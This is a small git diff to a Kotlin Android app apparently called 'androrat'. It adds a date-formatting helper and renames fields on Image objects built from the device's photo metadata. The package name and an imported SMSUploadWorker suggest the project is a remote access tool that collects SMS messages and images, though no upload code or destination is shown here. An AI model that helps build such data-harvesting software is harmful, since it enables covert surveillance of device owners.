@@ -61,6 +61,7 @@ import com.ierusalem.androrat.core.utils.Constants
 import com.ierusalem.androrat.core.utils.executeWithLifecycle
 import com.ierusalem.androrat.core.utils.log
 import com.ierusalem.androrat.core.utils.openAppSettings
+import com.ierusalem.androrat.core.utils.toReadableDate
 import com.ierusalem.androrat.core.worker.SMSUploadWorker
 import com.ierusalem.androrat.features.home.domain.HomeViewModel
 import com.ierusalem.androrat.features.home.domain.model.Image
@@ -473,11 +474,11 @@ class HomeFragment : Fragment() {
                                                     images.add(
                                                         Image(
                                                             id = id,
-                                                            author = author,
+                                                            author = author.toString(),
                                                             displayName = disPlayName,
-                                                            data = data,
-                                                            dataTaken = dataTaken,
-                                                            description = description,
+                                                            folderName = data,
+                                                            dateTaken = dataTaken.toReadableDate(),
+                                                            description = description.toString(),
                                                             uri = uri
                                                         )
                                                     )
